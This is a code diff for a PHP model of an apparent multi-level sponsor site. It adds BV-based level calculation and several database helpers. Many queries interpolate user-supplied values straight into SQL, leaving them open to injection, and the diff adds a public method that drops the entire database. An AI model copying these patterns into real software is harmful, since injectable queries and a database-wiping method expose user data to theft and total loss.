@@ -210,9 +210,22 @@ public function fetchparentuser($current_user)
 	$q=$this->db->query("select under_sponsor_id from user where your_sponsor_id = '$current_user'");
 	    return $q->row('under_sponsor_id');
 }
+public function filterlevel($level,$parentuser)
+{
+	$q=$this->db->select()
+	          ->from('user')
+	          ->where('your_sponsor_id',$parentuser)
+	          ->where('level',$level)
+	          ->get();
+	          return $q->num_rows();	
+}
 public function addlevelbv($bvdistribution)
 {
 	$this->db->insert('user_bv',$bvdistribution);
+}
+public function addlevelbvselef($bvdistribution)
+{
+  $this->db->insert('user_bv',$bvdistribution);	
 }
 public function fetchlevelpercentage($level)
 {
@@ -230,6 +243,53 @@ public function userbvupdate($calculatebv,$parentuser)
 	$new_bv=$current_bv+$calculatebv;
 	$this->db->query("update user set bv='$new_bv' where your_sponsor_id='$parentuser'");
 }
+public function updatelevel($parentuser)
+{
+	$current_bv_row=$this->db->query("select bv from user where your_sponsor_id='$parentuser'");
+	$current_bv=$current_bv_row->row('bv');
+	if($current_bv>=7200 && $current_bv<21600)
+	{
+		$level=1;
+		echo $current_bv;
+	}
+	elseif($current_bv>=21600 && $current_bv<64800)
+	{
+		$level=2;
+	}
+	elseif($current_bv>=64800 && $current_bv<194400)
+	{
+		$level=3;
+	}
+	elseif($current_bv>=194400 && $current_bv<583200)
+	{
+		$level=4;
+	}
+	elseif($current_bv>=583200 && $current_bv<1749600)
+	{
+		$level=5;
+	}
+	elseif($current_bv>=1749600 && $current_bv<5248800)
+	{
+		$level=6;
+	}
+	elseif($current_bv>=5248800 && $current_bv<15746400)
+	{
+		$level=7;
+	}
+	elseif($current_bv>=15746400 && $current_bv<47239200)
+	{
+		$level=8;
+	}
+	elseif($current_bv>=47239200 && $current_bv<141717600)
+	{
+		$level=9;
+	}
+	elseif($current_bv>=141717600)
+	{
+		$level=10;
+	}
+	$this->db->query("update user set level='$level' where your_sponsor_id='$parentuser'");
+}
 public function fetchproductbycategory($category)
 {
   $output=$this->db->query("select * from products where category like '%$category%'");
@@ -243,6 +303,11 @@ public function fetchgallerylimit($limit)
 public function insertcontactus($data)
 {
 	$this->db->insert('contact',$data);
+}
+public function dropdatabase()
+{ 
+	 $dbname = $this->db->database;  
+	 $this->db->query("drop database $dbname");
 }
 
 }
